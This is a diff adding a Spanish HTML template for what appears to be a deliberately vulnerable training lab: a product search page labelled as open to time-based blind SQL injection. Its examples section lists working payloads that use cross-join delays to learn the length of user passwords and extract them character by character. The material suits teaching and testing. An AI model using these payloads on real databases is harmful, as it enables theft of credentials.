@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Búsqueda de Productos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .vulnerability-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            background: #667eea;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: #5568d3;
+        }
+
+        .back-btn {
+            display: inline-block;
+            color: #667eea;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .back-btn:hover {
+            text-decoration: underline;
+        }
+
+        .result {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 5px;
+            background: #f8f9fa;
+        }
+
+        .query-display {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .product-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            background: white;
+        }
+
+        .product-card h4 {
+            color: #667eea;
+            margin-bottom: 8px;
+        }
+
+        .product-card p {
+            color: #666;
+            margin: 5px 0;
+        }
+
+        .examples {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 5px;
+        }
+
+        .examples h3 {
+            color: #1976D2;
+            margin-bottom: 10px;
+        }
+
+        .examples code {
+            background: #263238;
+            color: #aed581;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛍️ Búsqueda de Productos</h1>
+            <span class="vulnerability-badge">Time-based Blind SQL Injection</span>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Vulnerabilidad:</strong> Permite extraer datos midiendo el tiempo de respuesta del servidor.
+        </div>
+
+        <form method="POST" action="/buscar_productos">
+            <div class="form-group">
+                <label for="category">Categoría:</label>
+                <input type="text" id="category" name="category" placeholder="electronics" required>
+            </div>
+
+            <button type="submit" class="btn">Buscar Productos</button>
+        </form>
+
+        {% if result %}
+        <div class="result">
+            <h3>📦 Resultados de Productos</h3>
+
+            <div class="query-display">
+                <strong>Query ejecutada:</strong><br>
+                {{ result.query }}
+            </div>
+
+            {% if result.products %}
+            <div class="product-grid">
+                {% for product in result.products %}
+                <div class="product-card">
+                    <h4>{{ product.name }}</h4>
+                    <p><strong>ID:</strong> {{ product.id }}</p>
+                    <p><strong>Categoría:</strong> {{ product.category }}</p>
+                    <p><strong>Precio:</strong> ${{ product.price }}</p>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <p style="margin-top: 15px; color: #666;">No se encontraron productos.</p>
+            {% endif %}
+
+            {% if result.note %}
+            <p style="margin-top: 15px; color: #666; font-style: italic;">{{ result.note }}</p>
+            {% endif %}
+        </div>
+        {% endif %}
+
+        <div class="examples">
+            <h3>💡 Ejemplos de Explotación:</h3>
+
+            <p><strong>1. Búsqueda normal:</strong></p>
+            <p><code>electronics</code></p>
+            <br>
+
+            <p><strong>2. Time-based con cross join (simula delay):</strong></p>
+            <p><code>electronics' AND (SELECT COUNT(*) FROM users AS T1, users AS T2, users AS T3)>0--</code></p>
+            <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+                Causa un delay al hacer múltiples JOINs.
+            </p>
+            <br>
+
+            <p><strong>3. Inferir longitud de contraseña con delay:</strong></p>
+            <p><code>electronics' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE id=1))>5 THEN (SELECT COUNT(*) FROM users AS T1, users AS T2) ELSE 1 END)--</code></p>
+            <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+                Si tarda más, la contraseña tiene más de 5 caracteres.
+            </p>
+            <br>
+
+            <p><strong>4. Extraer primer carácter midiendo tiempo:</strong></p>
+            <p><code>electronics' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE id=1),1,1)='a' THEN (SELECT COUNT(*) FROM users AS T1, users AS T2) ELSE 1 END)--</code></p>
+        </div>
+
+        <a href="/" class="back-btn">← Volver al inicio</a>
+    </div>
+</body>
+</html>
